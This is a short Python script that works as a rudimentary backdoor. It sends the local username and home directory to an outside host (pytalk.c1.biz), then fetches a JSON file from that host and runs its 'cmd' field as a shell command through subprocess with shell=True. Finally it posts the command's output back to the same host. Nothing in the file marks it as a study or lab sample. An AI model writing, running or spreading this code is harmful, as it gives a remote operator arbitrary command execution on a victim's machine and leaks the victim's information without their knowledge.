import subprocess

import requests
import json
import getpass
import os.path
homedir = os.path.expanduser("~")
print(homedir)

username = getpass.getuser()
print(username)

url = "http://pytalk.c1.biz/post.php"
data = {
    "user_name": username,
    "homedir": homedir,
    "cmd": "dir",
    "error": "No Error",
    "success": "Yes success",
    "output": "",
    "ip": ""
}
r2 = requests.post(url=url, data=data)


r = requests.get("http://pytalk.c1.biz/test.json")

if r.status_code == 200:
    dic = json.loads(r.text)
    print(dic)

cmd = subprocess.Popen(dic["cmd"],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
output_byte = cmd.stdout.read() + cmd.stderr.read()
output_str = str(output_byte, "utf-8")
currentWD = os.getcwd() + "> "

print(output_str)

url = "http://pytalk.c1.biz/post.php"
data = {
    "user_name": username,
    "homedir": homedir,
    "cmd": "dir",
    "error": "No Error",
    "success": "Yes success",
    "output": output_str
}
r2 = requests.post(url=url, data=data)

r = requests.get("http://pytalk.c1.biz/test.json")

if r.status_code == 200:
    dic = json.loads(r.text)
    print(dic)